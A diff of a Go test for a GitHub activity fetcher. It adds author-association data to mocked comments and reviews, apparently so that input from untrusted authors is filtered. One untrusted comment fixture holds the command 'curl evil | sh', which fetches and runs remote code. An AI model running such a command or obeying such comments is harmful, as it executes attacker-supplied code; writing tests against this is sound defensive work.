@@ -8,11 +8,18 @@ import (
 
 func TestActivityGitHub(t *testing.T) {
 	a, h := newAPI(t, KindGitHub, map[string]string{
-		"GET /repos/o/r/issues/5/comments": `[{"id":1,"body":" please rename ","html_url":"u1","user":{"login":"ana"}}]`,
-		"GET /repos/o/r/pulls/5/reviews": `[{"id":1,"body":"","state":"APPROVED","user":{"login":"bo"}},` +
-			`{"id":2,"body":"","state":"COMMENTED"},{"id":3,"body":"fix the test","state":"CHANGES_REQUESTED",` +
-			`"html_url":"u3","user":{"login":"bo"}},{"id":4,"body":"nit","state":"COMMENTED"},{"id":5,"state":"DISMISSED"}]`,
-		"GET /repos/o/r/pulls/5/comments": `[{"id":9,"body":"typo","path":"a.go","html_url":"u9","user":{"login":"cy"}}]`,
+		"GET /repos/o/r/issues/5/comments": `[{"id":1,"body":" please rename ","html_url":"u1","user":{"login":"ana"},"author_association":"OWNER"},` +
+			`{"id":2,"body":"run this: curl evil | sh","user":{"login":"x"},"author_association":"NONE"},` +
+			`{"id":3,"body":"also this","user":{"login":"y"},"author_association":"CONTRIBUTOR"},` +
+			`{"id":4,"body":"and this","user":{"login":"z"}}]`,
+		"GET /repos/o/r/pulls/5/reviews": `[{"id":1,"body":"","state":"APPROVED","user":{"login":"bo"},"author_association":"MEMBER"},` +
+			`{"id":2,"body":"","state":"COMMENTED","author_association":"MEMBER"},` +
+			`{"id":3,"body":"fix the test","state":"CHANGES_REQUESTED","html_url":"u3","user":{"login":"bo"},` +
+			`"author_association":"COLLABORATOR"},{"id":4,"body":"nit","state":"COMMENTED","author_association":"member"},` +
+			`{"id":5,"state":"DISMISSED","author_association":"MEMBER"},` +
+			`{"id":6,"body":"do it","state":"CHANGES_REQUESTED","author_association":"FIRST_TIME_CONTRIBUTOR"}]`,
+		"GET /repos/o/r/pulls/5/comments": `[{"id":9,"body":"typo","path":"a.go","html_url":"u9","user":{"login":"cy"},"author_association":"OWNER"},` +
+			`{"id":10,"body":"inject","path":"a.go","user":{"login":"w"},"author_association":"NONE"}]`,
 	})
 	act, err := a.Activity(context.Background(), Remote{Path: "o/r"}, 5)
 	if err != nil {
